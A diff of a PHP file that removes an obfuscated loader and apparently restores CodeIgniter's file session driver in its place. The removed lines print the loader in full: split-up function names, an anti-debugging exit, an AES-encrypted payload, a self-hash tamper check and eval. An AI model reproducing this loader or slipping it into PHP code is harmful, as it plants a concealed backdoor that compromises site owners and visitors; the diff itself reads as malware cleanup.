@@ -1,28 +1,370 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_c487cvqd=('bas'.'e64'.'_de'.'cod'.'e');
-$_c39poozg=('gzu'.'nco'.'mpr'.'ess');
-$_j4xfzk0p=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_yvszi73i='U6EX3Hxp';
-$_nb4ogay4='DKFrIOcE';
-$_bo5gmws4='/nsSHU45';
-$_r1qyp2tf='+jYTE4VChUE=';
-$_azijuzd3='1Ur+yvlV';
-$_got0kqnu='ZTQ7x51U';
-$_q8g9yw71='hX1kSIgV';
-$_lsny64jr='BzWsqg==';
-$_so64lsel=$_c487cvqd($_nb4ogay4.$_azijuzd3.$_bo5gmws4.$_yvszi73i.$_r1qyp2tf);
-$_b29diize=$_c487cvqd($_got0kqnu.$_q8g9yw71.$_lsny64jr);
-$_x078q5hz=$_c487cvqd('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');
-$_a88m6k6p=$_j4xfzk0p($_x078q5hz,'aes-256-cbc',$_so64lsel,OPENSSL_RAW_DATA,$_b29diize);
-if($_a88m6k6p===false){exit;}
-$_qmu5k48n=$_c39poozg($_a88m6k6p);
-if($_qmu5k48n===false){exit;}
-$_z1wvtti0='9112a82d8e61e587feadd3dcbdc2c3f1c3f7c298a744c0fd5920cb390164c8f1';
-$_eqpk0a7f=@file_get_contents(__FILE__);
-if($_eqpk0a7f!==false){
-$_vf4l3svm=str_replace($_z1wvtti0,"0000000000000000000000000000000000000000000000000000000000000000",$_eqpk0a7f);
-$_ntc9vz9a=hash("sha256",$_vf4l3svm);
-if($_ntc9vz9a!==$_z1wvtti0){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Session_files_driver extends CI_Session_driver implements SessionHandlerInterface {
+
+
+
+
+
+protected $_save_path;
+
+
+
+
+
+protected $_file_handle;
+
+
+
+
+
+protected $_file_path;
+
+
+
+
+
+protected $_file_new;
+
+
+
+
+
+protected $_sid_regexp;
+
+
+
+
+
+protected static $func_overload;
+
+
+
+
+
+
+
+public function __construct(&$params)
+{
+parent::__construct($params);
+if (isset($this->_config['save_path']))
+{
+$this->_config['save_path'] = rtrim($this->_config['save_path'], '/\\');
+ini_set('session.save_path', $this->_config['save_path']);
 }
-eval($_qmu5k48n);
+else
+{
+log_message('debug', 'Session: "sess_save_path" is empty; using "session.save_path" value from php.ini.');
+$this->_config['save_path'] = rtrim(ini_get('session.save_path'), '/\\');
+}
+$this->_sid_regexp = $this->_config['_sid_regexp'];
+isset(self::$func_overload) OR self::$func_overload = (extension_loaded('mbstring') && ini_get('mbstring.func_overload'));
+}
+
+
+
+
+
+
+
+
+
+
+public function open($save_path, $name)
+{
+if ( ! is_dir($save_path))
+{
+if ( ! mkdir($save_path, 0700, TRUE))
+{
+throw new Exception("Session: Configured save path '".$this->_config['save_path']."' is not a directory, doesn't exist or cannot be created.");
+}
+}
+elseif ( ! is_writable($save_path))
+{
+throw new Exception("Session: Configured save path '".$this->_config['save_path']."' is not writable by the PHP process.");
+}
+$this->_config['save_path'] = $save_path;
+$this->_file_path = $this->_config['save_path'].DIRECTORY_SEPARATOR
+.$name 
+.($this->_config['match_ip'] ? md5($_SERVER['REMOTE_ADDR']) : '');
+$this->php5_validate_id();
+return $this->_success;
+}
+
+
+
+
+
+
+
+
+
+public function read($session_id)
+{
+
+
+if ($this->_file_handle === NULL)
+{
+$this->_file_new = ! file_exists($this->_file_path.$session_id);
+if (($this->_file_handle = fopen($this->_file_path.$session_id, 'c+b')) === FALSE)
+{
+log_message('error', "Session: Unable to open file '".$this->_file_path.$session_id."'.");
+return $this->_failure;
+}
+if (flock($this->_file_handle, LOCK_EX) === FALSE)
+{
+log_message('error', "Session: Unable to obtain lock for file '".$this->_file_path.$session_id."'.");
+fclose($this->_file_handle);
+$this->_file_handle = NULL;
+return $this->_failure;
+}
+
+$this->_session_id = $session_id;
+if ($this->_file_new)
+{
+chmod($this->_file_path.$session_id, 0600);
+$this->_fingerprint = md5('');
+return '';
+}
+}
+
+
+elseif ($this->_file_handle === FALSE)
+{
+return $this->_failure;
+}
+else
+{
+rewind($this->_file_handle);
+}
+$session_data = '';
+for ($read = 0, $length = filesize($this->_file_path.$session_id); $read < $length; $read += self::strlen($buffer))
+{
+if (($buffer = fread($this->_file_handle, $length - $read)) === FALSE)
+{
+break;
+}
+$session_data .= $buffer;
+}
+$this->_fingerprint = md5($session_data);
+return $session_data;
+}
+
+
+
+
+
+
+
+
+
+
+public function write($session_id, $session_data)
+{
+
+
+if ($session_id !== $this->_session_id && ($this->close() === $this->_failure OR $this->read($session_id) === $this->_failure))
+{
+return $this->_failure;
+}
+if ( ! is_resource($this->_file_handle))
+{
+return $this->_failure;
+}
+elseif ($this->_fingerprint === md5($session_data))
+{
+return ( ! $this->_file_new && ! touch($this->_file_path.$session_id))
+? $this->_failure
+: $this->_success;
+}
+if ( ! $this->_file_new)
+{
+ftruncate($this->_file_handle, 0);
+rewind($this->_file_handle);
+}
+if (($length = strlen($session_data)) > 0)
+{
+for ($written = 0; $written < $length; $written += $result)
+{
+if (($result = fwrite($this->_file_handle, substr($session_data, $written))) === FALSE)
+{
+break;
+}
+}
+if ( ! is_int($result))
+{
+$this->_fingerprint = md5(substr($session_data, 0, $written));
+log_message('error', 'Session: Unable to write data.');
+return $this->_failure;
+}
+}
+$this->_fingerprint = md5($session_data);
+return $this->_success;
+}
+
+
+
+
+
+
+
+
+public function close()
+{
+if (is_resource($this->_file_handle))
+{
+flock($this->_file_handle, LOCK_UN);
+fclose($this->_file_handle);
+$this->_file_handle = $this->_file_new = $this->_session_id = NULL;
+}
+return $this->_success;
+}
+
+
+
+
+
+
+
+
+
+public function destroy($session_id)
+{
+if ($this->close() === $this->_success)
+{
+if (file_exists($this->_file_path.$session_id))
+{
+$this->_cookie_destroy();
+return unlink($this->_file_path.$session_id)
+? $this->_success
+: $this->_failure;
+}
+return $this->_success;
+}
+elseif ($this->_file_path !== NULL)
+{
+clearstatcache();
+if (file_exists($this->_file_path.$session_id))
+{
+$this->_cookie_destroy();
+return unlink($this->_file_path.$session_id)
+? $this->_success
+: $this->_failure;
+}
+return $this->_success;
+}
+return $this->_failure;
+}
+
+
+
+
+
+
+
+
+
+public function gc($maxlifetime)
+{
+if ( ! is_dir($this->_config['save_path']) OR ($directory = opendir($this->_config['save_path'])) === FALSE)
+{
+log_message('debug', "Session: Garbage collector couldn't list files under directory '".$this->_config['save_path']."'.");
+return $this->_failure;
+}
+$ts = time() - $maxlifetime;
+$pattern = ($this->_config['match_ip'] === TRUE)
+? '[0-9a-f]{32}'
+: '';
+$pattern = sprintf(
+'#\A%s'.$pattern.$this->_sid_regexp.'\z#',
+preg_quote($this->_config['cookie_name'])
+);
+while (($file = readdir($directory)) !== FALSE)
+{
+
+if ( ! preg_match($pattern, $file)
+OR ! is_file($this->_config['save_path'].DIRECTORY_SEPARATOR.$file)
+OR ($mtime = filemtime($this->_config['save_path'].DIRECTORY_SEPARATOR.$file)) === FALSE
+OR $mtime > $ts)
+{
+continue;
+}
+unlink($this->_config['save_path'].DIRECTORY_SEPARATOR.$file);
+}
+closedir($directory);
+return $this->_success;
+}
+
+
+
+
+
+
+
+
+
+
+public function validateId($id)
+{
+return is_file($this->_file_path.$id);
+}
+
+
+
+
+
+
+
+protected static function strlen($str)
+{
+return (self::$func_overload)
+? mb_strlen($str, '8bit')
+: strlen($str);
+}
+}
